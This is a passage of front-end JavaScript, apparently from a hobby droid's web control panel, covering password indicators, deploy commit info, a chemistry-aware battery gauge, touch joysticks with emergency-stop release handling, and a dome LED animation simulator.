  const t = tiers[Math.min(score, tiers.length - 1)];
  bar.style.width = t.pct + '%';
  bar.style.background = t.color;
  label.textContent = v ? t.label : 'enter a password';
  label.style.color = t.color;
}
function updatePwdMatch() {
  const a = el('admin-pwd-new');
  const b = el('admin-pwd-confirm');
  const ind = el('admin-pwd-match');
  if (!a || !b || !ind) return;
  if (!b.value) { ind.textContent = ''; ind.className = 'pwd-match-indicator'; return; }
  if (a.value === b.value) {
    ind.textContent = '✓ passwords match';
    ind.className = 'pwd-match-indicator ok';
  } else {
    ind.textContent = '✗ passwords do not match';
    ind.className = 'pwd-match-indicator error';
  }
}
function checkCapsLock(ev, indicatorId) {
  const ind = el(indicatorId);
  if (!ind || !ev.getModifierState) return;
  ind.classList.toggle('hidden', !ev.getModifierState('CapsLock'));
}

// WOW polish I1 2026-05-15: load + render the current commit info
// in the Deploy panel. Operator sees the deployed SHA + remote SHA
// + behind count BEFORE deciding to update.
async function loadDeployCommitInfo() {
  const cur    = el('deploy-commit-current');
  const remote = el('deploy-commit-remote');
  const row    = el('deploy-behind-row');
  const behind = el('deploy-behind-count');
  if (cur)    cur.textContent    = 'loading…';
  if (remote) remote.textContent = 'loading…';
  try {
    // /system/version exposes current SHA. /system/deploy_status if it
    // exists exposes remote — try it; fall back gracefully.
    const ver = await api('/system/version');
    if (cur && ver) {
      const sha = (ver.commit || ver.sha || '').substring(0, 7);
      const msg = ver.message || ver.subject || '';
      cur.textContent = sha ? `${sha} — ${msg}` : (ver.version || 'unknown');
    }
    const dep = await api('/system/deploy_status').catch(() => null);
    if (remote && dep && dep.remote_sha) {
      remote.textContent = `${dep.remote_sha.substring(0, 7)} — ${dep.remote_msg || ''}`;
      if (dep.behind_count > 0 && row && behind) {
        row.style.display = 'flex';
        behind.textContent = `${dep.behind_count} commit${dep.behind_count > 1 ? 's' : ''} — UPDATE available`;
      } else if (row) {
        row.style.display = 'none';
      }
    } else if (remote) {
      remote.textContent = 'unavailable (no remote check endpoint)';
    }
  } catch {
    if (cur)    cur.textContent    = 'unavailable';
    if (remote) remote.textContent = 'unavailable';
  }
}

document.querySelectorAll('.tab').forEach(btn => {
  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
});

// ================================================================
// Battery Gauge
// ================================================================

class BatteryGauge {
  constructor() {
    this._arc      = el('battery-gauge-arc');
    this._arcMini  = el('battery-arc-path');
    this._text     = el('battery-gauge-text');
    this._pct      = el('battery-pct');
    this._TOTAL    = 170;   // full arc length (main)
    this._MINI     = 63;    // full arc length (mini header)
    this._cells    = 4;
    this._chem     = 'liion';
    this._MIN_V    = 14.0;
    this._MAX_V    = 16.8;
    this._perCellMin = 3.5;   // for color thresholds
    this._perCellMax = 4.2;
    this._lastV    = null;
  }

  // W4 fix 2026-05-16: chemistry-aware thresholds. Was: hardcoded LiPo
  // math (3.5/4.2) → LiFePO4 packs (nominal 3.2/cell, max 3.6/cell)
  // showed RED at full charge → operator panic-swapped healthy packs.
  // Now picks per-cell window per chemistry; setCells accepts a 2nd
  // arg for the chemistry (defaults to current).
  setCells(cells, chemistry) {
    cells = Math.max(1, parseInt(cells, 10) || 4);
    this._cells = cells;
    if (chemistry) this._chem = String(chemistry).toLowerCase();
    const CHEM = {
      liion:   { min: 3.5, max: 4.2, warn: 3.6, ok: 3.8 },
      lipo:    { min: 3.5, max: 4.2, warn: 3.6, ok: 3.8 },
      lifepo4: { min: 3.0, max: 3.6, warn: 3.2, ok: 3.3 },
    };
    const c = CHEM[this._chem] || CHEM.liion;
    this._perCellMin = c.min;
    this._perCellMax = c.max;
    this._perCellWarn = c.warn;
    this._perCellOk   = c.ok;
    this._MIN_V = cells * c.min;
    this._MAX_V = cells * c.max;
    if (this._lastV) this.update(this._lastV);
  }

  // Returns 0–100 percentage based on configured cell count
  voltToPct(v) {
    return Math.max(0, Math.min(100, ((v - this._MIN_V) / (this._MAX_V - this._MIN_V)) * 100));
  }

  voltToColor(v) {
    const vpc = v / Math.max(1, this._cells);
    return vpc >= (this._perCellOk   ?? 3.8) ? '#00cc66'
         : vpc >= (this._perCellWarn ?? 3.6) ? '#ff8800'
         : '#ff2244';
  }

  update(voltage) {
    this._lastV = voltage;
    // No voltage available → empty the arcs + show '--V' so a VESC
    // disconnect doesn't leave the last reading on screen.
    if (!voltage || voltage < 1) {
      if (this._arc)     { this._arc.style.strokeDashoffset = this._TOTAL; this._arc.style.stroke = 'var(--text-dim)'; }
      if (this._text)    { this._text.textContent = '--V';   this._text.style.fill  = 'var(--text-dim)'; }
      if (this._arcMini) { this._arcMini.style.strokeDashoffset = this._MINI; this._arcMini.style.stroke = 'var(--text-dim)'; }
      if (this._pct)     { this._pct.textContent  = '--V';   this._pct.style.color  = 'var(--text-dim)'; }
      return;
    }
    const pct   = Math.max(0, Math.min(1, (voltage - this._MIN_V) / (this._MAX_V - this._MIN_V)));
    const color = this.voltToColor(voltage);

    // Main arc
    if (this._arc) {
      const offset = this._TOTAL * (1 - pct);
      this._arc.style.strokeDashoffset = offset;
      this._arc.style.stroke = color;
    }
    if (this._text) {
      this._text.textContent = voltage.toFixed(1) + 'V';
      this._text.style.fill = color;
    }

    // Mini header arc
    if (this._arcMini) {
      const offsetMini = this._MINI * (1 - pct);
      this._arcMini.style.strokeDashoffset = offsetMini;
      this._arcMini.style.stroke = color;
    }
    if (this._pct) {
      this._pct.textContent = voltage.toFixed(1) + 'V';
      this._pct.style.color = color;
    }
  }
}

const batteryGauge = new BatteryGauge();

// ================================================================
// Virtual Joystick
// ================================================================

class VirtualJoystick {
  constructor(ringId, knobId, onMove, onStop, valXId = null, valYId = null) {
    this.ring   = el(ringId);
    this.knob   = el(knobId);
    this._lastSend = 0;   // throttle: ms timestamp of last onMove call
    // Perf 2026-05-15: 30Hz (33ms) instead of 60Hz (16.6ms). UART
    // can't consume faster than ~15Hz effective on M: commands, and
    // 60Hz was thermal-throttling older Android tablets after ~10min
    // of continuous joystick deflection (audit Perf #1).
    this._THROTTLE_MS = 1000 / 30;  // 30 req/s — matches UART ceiling
    this.onMove = onMove;
    this.onStop = onStop;
    this._valXId = valXId;
    this._valYId = valYId;
    this.active = false;
    this.x = 0;
    this.y = 0;
    this._keepAlive = null;  // timer keep-alive watchdog Master
    // Pointer Events ID tracked per-joystick. Mouse and touch both produce
    // pointer events; setPointerCapture binds subsequent move/up/cancel
    // events to THIS joystick's ring even if the pointer leaves the ring
    // (fixes the "drag out of window, release outside, joystick stays
    // active forever" runaway-drive bug). Tracking the id per-instance also
    // disambiguates multi-touch: two fingers (one on each joystick) each
    // get their own pointerId and won't cross-contaminate.
    this._pointerId = null;
    this._bind();
  }

  _bind() {
    const r = this.ring;
    // Pointer Events unify mouse + touch + pen with consistent pointerId
    // tracking. The two key safety features used here:
    //   1. setPointerCapture(id) — subsequent move/up/cancel events are
    //      delivered to THIS element regardless of where the pointer
    //      physically is. Lets us release the joystick correctly even when
    //      the user drags out of the browser window and releases outside.
    //   2. pointercancel + lostpointercapture — fire when the browser
    //      aborts the gesture (tab switch, modal interrupt, OS event), so
    //      we get a guaranteed cleanup path that mouseup never provided.
    r.addEventListener('pointerdown',         e => this._onPointerDown(e));
    r.addEventListener('pointermove',         e => this._onPointerMove(e));
    r.addEventListener('pointerup',           e => this._onPointerUp(e));
    r.addEventListener('pointercancel',       e => this._onPointerUp(e));
    r.addEventListener('lostpointercapture',  e => this._onPointerUp(e));
    // touchmove on the ring needs preventDefault to stop the browser from
    // hijacking the gesture for scroll/zoom on tablets. Pointer Events
    // don't auto-prevent page gestures — we still need this.
    r.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
  }

  _onPointerDown(e) {
    // Refuse a second pointer if we're already capturing one. Prevents a
    // mouse click while a touch is held from stealing the joystick.
    if (this._pointerId !== null) return;
    // Block all input during E-STOP — F-2. The overlay is pointer-events:
    // none (cosmetic), so without this check the user could grab the knob
    // visually while the server refuses the resulting POSTs (network spam +
    // confusing UX). Also exit early when this is the propulsion joystick
    // and lockMgr has drive locked, mirroring the onMove guard.
    if (typeof _estopTripped !== 'undefined' && _estopTripped) return;
    // Per-axis choreo gate: refuse pointerdown on the LEFT (propulsion)
    // joystick only when the active choreo uses propulsion. The right
    // joystick stays grabbable even during a dome-locked choreo
    // because the Y axis (future camera control in v2) remains free —
    // X is clamped to 0 inside the onMove handler instead.
    if (typeof _choreoPropLocked !== 'undefined' && _choreoPropLocked
        && this.ring && this.ring.id === 'js-left-ring') return;
    this._pointerId = e.pointerId;
    try { this.ring.setPointerCapture(e.pointerId); } catch {}
    this._start(e);
  }

  _onPointerMove(e) {
    if (e.pointerId !== this._pointerId) return;
    this._move(e);
  }

  _onPointerUp(e) {
    if (e.pointerId !== this._pointerId) return;
    this._pointerId = null;
    try { this.ring.releasePointerCapture(e.pointerId); } catch {}
    this._release();
  }

  // Forced release — called by E-STOP, window.blur, visibilitychange. Snaps
  // the knob back to center, stops the keep-alive interval, and fires the
  // onStop callback (which posts /motion/stop or /motion/dome/stop).
  forceRelease() {
    if (this._pointerId !== null) {
      try { this.ring.releasePointerCapture(this._pointerId); } catch {}
      this._pointerId = null;
    }
    // Audit finding Joystick M-4 + UX L-J 2026-05-15: cleanup the
    // keep-alive interval AND fire onStop unconditionally on
    // forceRelease, even if `active` was already false. Previously
    // an E-STOP fired between pointerdown and the first pointermove
    // would leave _keepAlive running (impossible by current code,
    // fragile) and never fire onStop. Defense-in-depth.
    if (this._keepAlive) {
      clearInterval(this._keepAlive);
      this._keepAlive = null;
    }
    if (this.active) {
      this._release();
    } else if (this.onStop) {
      // Even without an active drag, ensure the server gets a stop
      // so a borderline-down release path doesn't leave motion alive.
      try { this.onStop(); } catch {}
    }
  }

  _start(ptr) {
    this.active = true;
    this.ring.classList.add('active');
    this._move(ptr);
    // Keep-alive : renvoie la position courante toutes les 200ms pendant que
    // le joystick est tenu immobile — alimente le MotionWatchdog côté Master.
    this._keepAlive = setInterval(() => {
      if (!this.active) return;
      // F-13: skip keep-alive when at center (or within tiny deadzone).
      // The keep-alive's job is to refresh MotionWatchdog so a held
      // joystick keeps moving the robot — but when (x, y) ≈ (0, 0) the
      // robot is already commanded to stop and there's nothing to keep
      // alive. Re-firing onMove(0, 0) at 5 Hz was pure log + network spam.
      if (Math.abs(this.x) + Math.abs(this.y) < 0.02) return;
      this.onMove(this.x, this.y);
      // Audit finding Joystick M-1 2026-05-15: update _lastSend so
      // the throttle in _move() doesn't immediately allow a 7th
      // request within 16ms after the keep-alive ticks.
      this._lastSend = performance.now();
    }, 200);
  }

  _move(ptr) {
    if (!this.active) return;
    const rect   = this.ring.getBoundingClientRect();
    const cx     = rect.left + rect.width  / 2;
    const cy     = rect.top  + rect.height / 2;
    const radius = rect.width / 2;
    const dx     = ptr.clientX - cx;
    const dy     = ptr.clientY - cy;
    const maxR   = radius * 0.72;
    const dist   = Math.sqrt(dx * dx + dy * dy);
    const clamp  = Math.min(dist, maxR);
    const angle  = Math.atan2(dy, dx);
    const kx     = Math.cos(angle) * clamp;
    const ky     = Math.sin(angle) * clamp;

    this.x = Math.max(-1, Math.min(1, dx / maxR));
    this.y = Math.max(-1, Math.min(1, dy / maxR));

    this.knob.style.transform = `translate(calc(-50% + ${kx}px), calc(-50% + ${ky}px))`;
    // WOW polish D3 2026-05-15: knob color gradient based on deflection
    // magnitude. Visual intensity feedback — operator immediately sees
    // "I'm at 80% throttle" vs "I'm at 10%". Green=low, amber=mid,
    // red=max. Applies to both joysticks (propulsion + dome).
    const magnitude = Math.min(1, Math.hypot(this.x, this.y));
    let knobColor;
    if (magnitude < 0.33)      knobColor = 'var(--green, #00cc66)';
    else if (magnitude < 0.66) knobColor = 'var(--amber, #ffaa44)';
    else                       knobColor = 'var(--red, #ff2244)';
    this.knob.style.backgroundColor = knobColor;
    this.knob.style.boxShadow = `0 0 ${8 + magnitude * 16}px ${knobColor}`;
    const now = performance.now();
    if (now - this._lastSend >= this._THROTTLE_MS) {
      this._lastSend = now;
      this.onMove(this.x, this.y);
    }

    // Android haptic feedback — light vibration when joystick moves significantly
    const nx = this.x;
    const ny = this.y;
    if (window.AndroidBridge && Math.abs(nx) + Math.abs(ny) > 0.1) {
      window.AndroidBridge.vibrate(20);
    }

    // Update value displays
    if (this._valXId) {
      const vx = el(this._valXId);
      if (vx) vx.textContent = this.x.toFixed(2);
    }
    if (this._valYId) {
      const vy = el(this._valYId);
      if (vy) vy.textContent = this.y.toFixed(2);
    }
  }

  _release() {
    this.active = false;
    clearInterval(this._keepAlive);
    this._keepAlive = null;
    this.x = 0;
    this.y = 0;
    // LOW polish 2026-05-15: reset throttle timestamp on release so
    // the operator's next press fires immediately instead of being
    // throttled by the residual _lastSend from the previous session.
    this._lastSend = 0;
    this.ring.classList.remove('active');
    this.knob.style.transform = 'translate(-50%, -50%)';
    // WOW polish D3: reset the gradient color on release so the knob
    // visually returns to "neutral" state instead of staying red.
    this.knob.style.backgroundColor = '';
    this.knob.style.boxShadow = '';
    this.onStop();
    if (this._valXId) { const v = el(this._valXId); if (v) v.textContent = '0.00'; }
    if (this._valYId) { const v = el(this._valYId); if (v) v.textContent = '0.00'; }
  }

  /** Move the knob visually from an external source (BT gamepad / web
   *  joystick mirror). x, y ∈ [-1, 1]. Does NOT fire onMove or any HTTP
   *  request — the caller already POSTed the motion separately. */
  setExternal(x, y) {
    if (this.active) return;   // touch joystick has priority
    const maxR = this.ring.offsetWidth / 2;
    const kx   = x * maxR;
    const ky   = y * maxR;
    this.knob.style.transform = `translate(calc(-50% + ${kx}px), calc(-50% + ${ky}px))`;
    if (this._valXId) { const v = el(this._valXId); if (v) v.textContent = x.toFixed(2); }
    if (this._valYId) { const v = el(this._valYId); if (v) v.textContent = y.toFixed(2); }
    // Drive HUD mirror — without this the speed arc + direction arrow
    // stayed at 0 while a BT gamepad was actively driving the robot,
    // making the HUD silently lie. Only the LEFT joystick drives the
    // HUD (right is dome rotation — separate). Probe `this.ring.id` to
    // decide.
    if (this.ring && this.ring.id === 'js-left-ring' && typeof _updateDriveHUD === 'function') {
      // jsLeft onMove maps (x, y) → (throttle=-y, steering=x*0.55)
      // Mirror the same mapping here so the HUD shows the same values.
      _updateDriveHUD(-y, x * 0.55);
    }
  }
}

// ================================================================
// Propulsion & Dome
// ================================================================

let _speedLimit = 0.6;

// Lights backend — tracked globally so palette + editor use correct raw label
let _lightsBackend = 'teeces';

// Snapshot of hardware-config values taken at last load. Used by
// saveHardwareConfig() to compute a diff and only send the keys the user
// actually changed (so a UART-only edit does not trigger Slave restart or
// the misleading "Master reboot required" toast).
let _hardwareLoaded = null;
function _rawLabel() {
  return _lightsBackend === 'astropixels' ? '⚙️ Raw @-command' : '⚙️ Raw JawaLite';
}
function _updateRawPaletteItem() {
  const item = el('light-palette-raw');
  if (item) item.textContent = _rawLabel();
}

// ================================================================
// Dome Simulation — FLD Top/Bot (5×9), RLD (4×27), PSI front/rear
// ================================================================
const _domeSim = (() => {
  // ── Pixel fonts (3-wide glyphs + 1 gap) ──────────────────────
  const FONT5 = {
    'A':[2,5,7,5,5],'B':[6,5,6,5,6],'C':[3,4,4,4,3],'D':[6,5,5,5,6],'E':[7,4,6,4,7],
    'F':[7,4,6,4,4],'G':[3,4,5,5,3],'H':[5,5,7,5,5],'I':[7,2,2,2,7],'J':[1,1,1,5,2],
    'K':[5,5,6,5,5],'L':[4,4,4,4,7],'M':[5,7,7,5,5],'N':[5,7,5,5,5],'O':[2,5,5,5,2],
    'P':[6,5,6,4,4],'Q':[2,5,5,7,3],'R':[6,5,6,5,5],'S':[3,4,2,1,6],'T':[7,2,2,2,2],
    'U':[5,5,5,5,2],'V':[5,5,5,5,2],'W':[5,5,7,7,5],'X':[5,5,2,5,5],'Y':[5,5,2,2,2],
    'Z':[7,1,2,4,7],'0':[2,5,5,5,2],'1':[2,6,2,2,7],'2':[6,1,2,4,7],'3':[6,1,2,1,6],
    '4':[5,5,7,1,1],'5':[7,4,6,1,6],'6':[3,4,6,5,2],'7':[7,1,2,2,2],'8':[2,5,2,5,2],
    '9':[2,5,3,1,6],' ':[0,0,0,0,0],'!':[2,2,2,0,2],'?':[6,1,2,0,2],'.':[0,0,0,0,2],
    '-':[0,0,7,0,0],':':[0,2,0,2,0],'+':[0,2,7,2,0],'♥':[0,5,7,2,0],'#':[5,7,5,7,5],
  };
  const FONT4 = {
    'A':[2,5,7,5],'B':[6,6,5,6],'C':[3,4,4,3],'D':[6,5,5,6],'E':[7,6,4,7],
    'F':[7,6,4,4],'G':[3,4,5,3],'H':[5,7,5,5],'I':[7,2,2,7],'J':[1,1,5,2],
    'K':[5,6,6,5],'L':[4,4,4,7],'M':[5,7,5,5],'N':[5,7,5,5],'O':[2,5,5,2],
    'P':[6,5,6,4],'Q':[2,5,7,3],'R':[6,5,6,5],'S':[3,2,1,6],'T':[7,2,2,2],
    'U':[5,5,5,2],'V':[5,5,5,2],'W':[5,5,7,5],'X':[5,2,2,5],'Y':[5,5,2,2],
    'Z':[7,2,4,7],'0':[2,5,5,2],'1':[2,6,2,7],'2':[6,2,4,7],'3':[6,2,1,6],
    '4':[5,7,1,1],'5':[7,6,1,6],'6':[3,6,5,2],'7':[7,1,2,2],'8':[2,2,5,2],
    '9':[2,5,3,1],' ':[0,0,0,0],'!':[2,2,0,2],'?':[6,2,0,2],'.':[0,0,0,2],
    '-':[0,7,0,0],':':[2,0,2,0],'+':[0,7,2,0],'♥':[5,7,2,0],
  };

  const CFG = {
    'fld-top': { rows:5, cols:9, cls:'dot-fld' },
    'fld-bot': { rows:5, cols:9, cls:'dot-fld' },
    'rld':     { rows:4, cols:27, cls:'dot-rld' },
  };

  // mode number → sim mode key
  const MODE_MAP = {
    1:'random', 2:'flash', 3:'alarm', 4:'short', 5:'scream',
    6:'leia', 7:'love', 8:'sweep', 9:'pulse', 10:'starwars',
    11:'imperial', 12:'disco', 13:'disco', 14:'alarm', 15:'sweep',
    16:'white', 17:'redon', 18:'greenon', 19:'saber', 20:'off',
    21:'pulse', 92:'pulse',
  };

  const META = {
    random:   { label:'✨ RANDOM',        color:'#00aaff' },
    flash:    { label:'⚡ FLASH',          color:'#ffcc00' },
    alarm:    { label:'🚨 ALARM',          color:'#ff3355' },
    short:    { label:'💥 SHORT CIRCUIT',  color:'#ff8800' },
    scream:   { label:'😱 SCREAM',         color:'#00ffea' },
    leia:     { label:'🌀 LEIA',           color:'#aa66ff' },
    love:     { label:'❤️ I ♥ U',          color:'#ff66cc' },
    sweep:    { label:'↔️ SWEEP',           color:'#00aaff' },
    pulse:    { label:'💓 PULSE',          color:'#00cc66' },
    starwars: { label:'⭐ STAR WARS',      color:'#ffdd00' },
    imperial: { label:'🎵 IMPERIAL',       color:'#ff8800' },
    disco:    { label:'🪩 DISCO',          color:'#ff66cc' },
    saber:    { label:'⚔️ LIGHTSABER',      color:'#44ff88' },
    redon:    { label:'🔴 RED ON',         color:'#ff2244' },
    greenon:  { label:'🟢 GREEN ON',       color:'#00cc66' },
    white:    { label:'⬜ TEST WHITE',     color:'#ddeeff' },
    off:      { label:'⬛ OFF',            color:'#445566' },
    text:     { label:'💬 TEXT',           color:'#00ffea' },
  };

  let _tick = 0;
  let _mode = 'random';
  let _lastShort = 0;
  let _running = false;
  // B2/P1 fix 2026-05-16: pause/resume gate. Without this the rAF
  // loop kept firing 60Hz forever (~24k style writes/sec across 198
  // dots) while the operator was on Drive/Audio/etc. — `display:none`
  // does NOT auto-pause rAF (only browser-tab-hidden does). Mirrors
  // the existing _chorMon pattern (L2326).
  let _active = false;
  const _textState = {
    'fld-top': { buf:null, scroll:0, color:'#00ffea', active:false },
    'fld-bot': { buf:null, scroll:0, color:'#00aaff', active:false },
    'rld':     { buf:null, scroll:0, color:'#ff8800', active:false },
  };

  // PSI is independent of T-code animations (firmware: @0T only affects FLD+RLD, not PSI).
  // Start active=true so T-code render loop never overrides PSI.
  // Default = NORMAL sequence (blue slow blink). Only applyPSI/resetPSI change this.
  const _psiCustom = {
    front: { c1:'#00aaff', c2:'#0055aa', speed:0.8, active:true },
    rear:  { c1:'#00aaff', c2:'#0055aa', speed:0.8, active:true },
  };

  function _buildBuf(text, rows, font) {
    const buf = Array.from({ length: rows }, () => []);
    (text.toUpperCase() + '   ').split('').forEach(ch => {
      const g = font[ch] || font[' '];
      for (let c = 0; c < 3; c++) for (let r = 0; r < rows; r++) buf[r].push((g[r] >> (2 - c)) & 1);
      for (let r = 0; r < rows; r++) buf[r].push(0);
    });
    return buf;
  }

  function _getDots(id) {
    const e = document.getElementById(id);
    return e ? Array.from(e.querySelectorAll('.sim-dot')) : [];
  }

  function _lit(d, c) { if (!d) return; d.style.background = c; d.style.boxShadow = `0 0 4px ${c}`; }
  function _dim(d)    { if (!d) return; d.style.background = 'rgba(0,170,255,0.07)'; d.style.boxShadow = 'none'; }

  function _setPSI(front, rear) {
    const pf = document.getElementById('psi-front');
    const pr = document.getElementById('psi-rear');
    if (pf && !_psiCustom.front.active) { pf.style.background = front; pf.style.boxShadow = `0 0 14px ${front}`; }
    if (pr && !_psiCustom.rear.active)  { pr.style.background = rear;  pr.style.boxShadow = `0 0 14px ${rear}`; }
  }

  // P3 fix 2026-05-16: cache last applied PSI color per side. Without
  // this, every frame writes style.background even when color hasn't
  // changed (most frames stay in phase<0.5 OR phase>=0.5 for many
  // ticks). 60Hz × 2 sides × 2 style writes/dot = needless layout
  // pressure. Cache lets the CSS .psi-circle transition:.3s finish
  // cleanly instead of being fought by JS every frame.
  const _psiLastColor = { front: null, rear: null };
  function _renderCustomPSI() {
    const now = Date.now() / 1000;
    for (const [side, elemId] of [['front','psi-front'],['rear','psi-rear']]) {
      const s = _psiCustom[side];
      if (!s.active) continue;
      const phase = (now % s.speed) / s.speed;
      const color = phase < 0.5 ? s.c1 : s.c2;
      if (color === _psiLastColor[side]) continue;   // skip — unchanged
      _psiLastColor[side] = color;
      const e = document.getElementById(elemId);
      if (e) { e.style.background = color; e.style.boxShadow = color === '#000000' ? 'none' : `0 0 14px ${color}`; }
    }
  }

  function _renderText(id) {
    const st = _textState[id];
    if (!st.buf) return;
    const { rows, cols } = CFG[id];
    const dots = _getDots(id);
    const bufLen = st.buf[0]?.length || 1;
    st.scroll = (st.scroll + 1) % (bufLen + cols);
    for (let r = 0; r < rows; r++) for (let c = 0; c < cols; c++) {
      const bIdx = c + st.scroll - cols;
      const on = bIdx >= 0 && bIdx < bufLen && st.buf[r] && st.buf[r][bIdx];
      on ? _lit(dots[r * cols + c], st.color) : _dim(dots[r * cols + c]);
    }
  }

  const _modes = {
    random(t) {
      ['fld-top','fld-bot','rld'].forEach((id, si) => {
        const {rows,cols}=CFG[id]; const dots=_getDots(id);
        for(let r=0;r<rows;r++) for(let c=0;c<cols;c++)
          Math.sin(t*0.07+(r*cols+c+si*23)*0.73)>0.1?_lit(dots[r*cols+c],'#00aaff'):_dim(dots[r*cols+c]);
      });
      _setPSI('#00aaff','#0077cc');
    },
    flash(t) {
      const on=Math.floor(t/5)%2===0;
      ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>on?_lit(d,'#ffcc00'):_dim(d)));
      _setPSI(on?'#ffcc00':'#221100',on?'#ffaa00':'#110800');
    },
    alarm(t) {
      const sw=Math.floor(t*0.1)%9;
      ['fld-top','fld-bot'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.abs(c-sw)<2?_lit(dots[r*cols+c],'#ff2244'):_dim(dots[r*cols+c]);
      });
      const sw2=Math.floor(t*0.1)%27;const{rows:rr,cols:rc}=CFG['rld'];const rd=_getDots('rld');
      for(let r=0;r<rr;r++)for(let c=0;c<rc;c++)Math.abs(c-sw2)<3?_lit(rd[r*rc+c],'#ff2244'):_dim(rd[r*rc+c]);
      _setPSI('#ff2244','#ff0022');
    },
    short(t) {
      const cs=['#ff2244','#ffcc00','#00ffea','#ff8800','#aa66ff','#00cc66','#fff'];
      ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>Math.random()>0.65?_lit(d,cs[Math.floor(Math.random()*cs.length)]):_dim(d)));
      _setPSI(cs[Math.floor(t*0.18)%cs.length],cs[(Math.floor(t*0.18)+3)%cs.length]);
    },
    scream(t) {
      ['fld-top','fld-bot','rld'].forEach((id,si)=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)
          Math.sin(t*0.14+(r*cols+c+si*11)*0.4)*0.5+0.5>0.35?_lit(dots[r*cols+c],'#00ffea'):_dim(dots[r*cols+c]);
      });
      _setPSI('#00ffea','#009988');
    },
    leia(t) {
      const wave=(t*0.03)%1;
      ['fld-top','fld-bot','rld'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++){
          const frac=c/cols,dist=Math.min(Math.abs(frac-wave),1-Math.abs(frac-wave));
          dist<0.22?_lit(dots[r*cols+c],'#9955ff'):_dim(dots[r*cols+c]);
        }
      });
      _setPSI('#9955ff','#7733bb');
    },
    love(t) {
      const beat=Math.sin(t*0.14)*0.5+0.5>0.35;
      ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>beat?_lit(d,'#ff66cc'):_dim(d)));
      _setPSI(beat?'#ff66cc':'#330011',beat?'#ff44aa':'#220011');
    },
    sweep(t) {
      const pos=Math.sin(t*0.04)*0.5+0.5;
      ['fld-top','fld-bot','rld'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)
          Math.abs(c/cols-pos)<0.12?_lit(dots[r*cols+c],'#00aaff'):_dim(dots[r*cols+c]);
      });
      _setPSI('#00aaff','#0066aa');
    },
    pulse(t) {
      const v=Math.sin(t*0.09)*0.5+0.5;
      ['fld-top','fld-bot','rld'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)c/cols<v?_lit(dots[r*cols+c],'#00cc66'):_dim(dots[r*cols+c]);
      });
      _setPSI('#00cc66','#009944');
    },
    starwars(t) {
      ['fld-top','fld-bot','rld'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);const sp=Math.floor(t*0.07);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)(c+sp)%cols<3?_lit(dots[r*cols+c],'#ffdd00'):_dim(dots[r*cols+c]);
      });
      _setPSI('#ffdd00','#bb9900');
    },
    imperial(t) {
      const beat=Math.sin(t*0.22)*0.5+0.5>0.55;
      ['fld-top','fld-bot','rld'].forEach((id,si)=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)
          Math.sin(t*0.18+(r*cols+c+si*7)*0.45)*0.5+0.5*(beat?1:0.3)>0.4?_lit(dots[r*cols+c],'#ff8800'):_dim(dots[r*cols+c]);
      });
      _setPSI(beat?'#ff8800':'#331100',beat?'#ff6600':'#221100');
    },
    disco(t) {
      const cs=['#ff2244','#ffcc00','#00ffea','#ff66cc','#8844ff','#00cc66','#ff8800'];
      ['fld-top','fld-bot','rld'].forEach((id,si)=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)_lit(dots[r*cols+c],cs[(Math.floor(t*0.09)+(r*cols+c+si*5))%cs.length]);
      });
      _setPSI(cs[Math.floor(t*0.12)%cs.length],cs[(Math.floor(t*0.12)+3)%cs.length]);
    },
    saber(t) {
      const pos=Math.sin(t*0.05)*0.5+0.5;
      ['fld-top','fld-bot','rld'].forEach(id=>{
        const{rows,cols}=CFG[id];const dots=_getDots(id);
        for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)c/cols<pos?_lit(dots[r*cols+c],'#44ff88'):_dim(dots[r*cols+c]);
      });
      _setPSI('#44ff88','#22cc55');
    },
    redon()   { ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>_lit(d,'#ff2244'))); _setPSI('#ff2244','#cc0022'); },
    greenon() { ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>_lit(d,'#00cc66'))); _setPSI('#00cc66','#009944'); },
    white()   { ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>_lit(d,'#eef2ff'))); _setPSI('#ffffff','#ccddff'); },
    off()     { ['fld-top','fld-bot','rld'].forEach(id=>_getDots(id).forEach(d=>_dim(d))); _setPSI('#0a0e14','#0a0e14'); },
    text(t) {
      // Scroll every 8 frames (~133ms at 60fps) — more readable
      if (t % 8 === 0) {
        ['fld-top','fld-bot','rld'].forEach(id => {
          if (_textState[id].active) {
            _renderText(id);
          } else {
            const {rows,cols}=CFG[id];const dots=_getDots(id);
            for(let r=0;r<rows;r++) for(let c=0;c<cols;c++)
              Math.sin(t*0.07+(r*cols+c)*0.5)>0.1?_lit(dots[r*cols+c],'rgba(0,170,255,0.3)'):_dim(dots[r*cols+c]);
          }
        });
      }
      _setPSI('#00ffea','#ff8800');
    },
  };

  function _loop() {
    // B2/P1 fix 2026-05-16: bail early when paused (operator not on
    // Lights tab). Without this, 60Hz loop keeps writing styles on
    // hidden DOM nodes for nothing.
    if (!_active) return;
    _tick++;
    // P2 fix 2026-05-16: throttle to ~20Hz (every 3rd rAF frame).
    // disco/random/scream redraw 198 dots × 2 style writes = 396
    // writes/frame; 60Hz vs 20Hz is the difference between 24k and
    // 8k writes/sec for the same visual quality (LED dots are too
    // small for the eye to perceive >30Hz transitions). Major Pi 4B
    // tablet WebView CPU saving.
    if ((_tick & 3) === 0) {
